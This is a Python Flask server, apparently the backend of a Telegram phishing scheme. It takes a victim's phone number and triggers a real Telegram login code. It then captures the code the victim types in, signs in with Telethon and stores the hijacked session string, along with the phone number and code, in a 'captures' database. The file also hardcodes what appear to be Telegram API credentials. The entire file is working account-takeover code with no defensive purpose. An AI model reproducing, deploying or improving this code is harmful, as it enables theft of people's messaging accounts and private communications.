from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
from telethon import TelegramClient
import sqlite3

app = Flask(__name__)
CORS(app)

API_ID = 35339777
API_HASH = '0787285b3a4c01fda1fe83c8ff2d0b71'
DB_PATH = 'captures.db'

@app.route('/bot', methods=['POST'])
def handle():
    data = request.get_json()
    method = data.get('method')
    user_id = data.get('userId')
    fake_code = data.get('fakeCode')
    
    if method == 'send_otp':
        phone = data.get('phone')
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            client = TelegramClient('temp', API_ID, API_HASH)
            loop.run_until_complete(client.start(phone=phone))
            loop.run_until_complete(client.disconnect())
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('UPDATE logs SET phone=? WHERE user_id=? AND fake_code=?',
                      (phone, int(user_id), fake_code))
            conn.commit()
            conn.close()
            return jsonify({'success': True})
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})
    
    elif method == 'verify_otp':
        otp = data.get('otp')
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('SELECT phone FROM logs WHERE user_id=? AND fake_code=?',
                      (int(user_id), fake_code))
            row = c.fetchone()
            conn.close()
            if not row:
                return jsonify({'success': False, 'error': 'Phone not found'})
            phone = row[0]
            client = TelegramClient('temp', API_ID, API_HASH)
            loop.run_until_complete(client.start(phone=phone))
            loop.run_until_complete(client.sign_in(phone=phone, code=otp))
            session_str = client.session.save()
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('UPDATE logs SET real_otp=?, session=? WHERE user_id=? AND fake_code=?',
                      (otp, session_str, int(user_id), fake_code))
            conn.commit()
            conn.close()
            loop.run_until_complete(client.disconnect())
            return jsonify({'success': True})
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})
    
    return jsonify({'success': False, 'error': 'Invalid method'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
